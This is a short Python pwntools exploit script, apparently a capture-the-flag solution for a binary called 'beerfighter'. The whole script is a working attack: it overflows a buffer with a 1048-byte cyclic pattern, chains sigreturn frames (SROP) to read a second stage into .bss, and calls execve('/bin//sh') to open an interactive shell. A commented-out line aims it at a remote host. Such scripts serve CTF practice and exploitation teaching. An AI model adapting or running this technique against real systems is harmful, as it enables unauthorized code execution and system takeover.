#!/usr/bin/env python2

from pwn import *

p = process("./1510917674.66_beerfighter")
# p = remote("www.myabandonware.com", 5500)

context(arch='amd64', endian='little')

bss = 0x6022a0
ropstack = 0x6022a8

sigret =  ""
sigret += p64(0x00000000004007b2) # pop rax ; ret ;
sigret += p64(15)
sigret += p64(0x000000000040077f) # clc ; syscall ;

frame2 = SigreturnFrame(kernel='amd64')

# We set 64 bits register to get make a call to execve("/bin//sh", 0, 0)
frame2.rax = constants.SYS_execve
frame2.rdi = bss
frame2.rsi = 0 # bss
frame2.rdx = 0
frame2.rsp = 0xdeadbeef # We don't really care about whether the stack frame is correct
frame2.rip = 0x000000000040077f # SYSCALL 64bit instruction address

# Let's create a SROP context
frame1 = SigreturnFrame(kernel='amd64')

# We set 64 bits register to get make a call to execve("/bin//sh", 0, 0)
frame1.rax = constants.SYS_read
frame1.rdi = 0
frame1.rsi = bss # bss
frame1.rdx = len(str(frame2)) #
frame1.rsp = ropstack # SROP pivot
frame1.rbp = 0xb00b4dad
frame1.rip = 0x000000000040077f # SYSCALL 64bit instruction address

p.readuntil("> ")
p.sendline("1")
p.readuntil("> ")
p.sendline("0")

p.readuntil("> ")

payload1 =  ""
payload1 += cyclic(1048)
payload1 += sigret
payload1 += str(frame1)

p.sendline(payload1)
p.readuntil("> ")

# raw_input("Process ID: [%d]" % p.pid)

p.sendline("3")

p.sendline("/bin/sh\00"+sigret+str(frame2))

p.interactive()


